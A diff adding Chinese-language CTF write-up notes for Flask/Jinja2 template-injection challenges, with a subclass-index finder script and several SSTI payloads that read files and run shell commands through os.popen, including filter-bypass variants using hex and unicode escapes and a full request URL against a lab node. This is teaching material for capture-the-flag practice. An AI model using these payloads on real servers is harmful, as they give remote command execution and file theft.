@@ -69,3 +69,65 @@ python -m fenjing crack --method POST --inputs user_input --url 'https://web-par
 ```
 
 ![image-20240716004841315](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716004841315.png)
+
+## [pasecactf_2019]flask_ssti
+
+找可用类脚本：
+
+```
+import json
+
+a = """
+"""
+
+num = 0
+allList = []
+
+result = ""
+for i in a:
+    if i == ">":
+        result += i
+        allList.append(result)
+        result = ""
+    elif i == "\n" or i == ",":
+        continue
+    else:
+        result += i
+
+for k, v in enumerate(allList):
+    if "os._wrap_close" in v:
+        print(str(k) + "--->" + v)
+
+```
+
+![image-20240716013251366](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716013251366.png)
+
+```
+{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
+```
+
+## [NewStarCTF 公开赛赛道]BabySSTI_One Two Three
+
+命令执行：
+
+```
+tail /fl**
+```
+
+```
+{{cycler.next.__globals__.__builtins__.__import__('os').popen('tail /fl**').read()}}
+```
+
+```
+{%set       ta='\x74\x61\x69\x6c\x20\x2f\x66\x6c\x2a\x2a'%}{{cycler.next['__g''lobals__']['__b''uiltins__'].__import__('os')['p''open'](ta).read()}}
+```
+
+![image-20240716020308261](C:\Users\92579\AppData\Roaming\Typora\typora-user-images\image-20240716020308261.png)
+
+将 _ 16进制编码:
+
+```
+http://53d96c09-d564-4c54-9c4f-3c3454c40527.node5.buuoj.cn:81/?name=payload%EF%BC%9A?name={{[][%27\x5f\x5fcl%27%27ass\x5f\x5f%27][%27\x5f\x5fba%27%27se\x5f\x5f%27][%27\x5f\x5fsubc%27%27lasses\x5f\x5f%27]()[117][%27\x5f\x5fin%27%27it\x5f\x5f%27][%27\x5f\x5fglo%27%27bals\x5f\x5f%27][%27po%27%27pen%27](%27\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064%27).read()}}
+```
+
+`
